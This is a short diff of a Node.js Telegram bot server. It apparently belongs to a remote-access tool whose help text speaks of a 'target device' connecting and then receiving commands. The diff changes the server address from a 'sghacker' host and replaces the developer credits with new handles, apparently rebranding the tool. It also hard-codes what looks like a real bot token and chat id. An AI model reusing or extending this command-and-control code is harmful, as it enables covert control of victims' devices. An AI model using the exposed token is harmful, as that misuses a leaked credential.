@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = '7394158230:AAE6m5eowQUcJpMeqfWj63LMTGSoUrSDSF0';  // Replace with your actual bot token
 const id = '1249726999';        // Replace with your actual bot id
-const address = 'https://sghacker.adaptable.app';
+const address = 'https://www.google.com';
 
 const app = express();
 const appServer = http.createServer(app);
@@ -339,7 +339,7 @@ appBot.on('message', (message) => {
                 '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                 '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
                 '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ\n\n' +
-                '• ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @shivayadavv / @hackdagger & https://github.com/Did-Dog',
+                '• ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ : @SG_Modder / @SG_Modder1',
                 {
                     parse_mode: "HTML",
                     disable_web_page_preview: true,
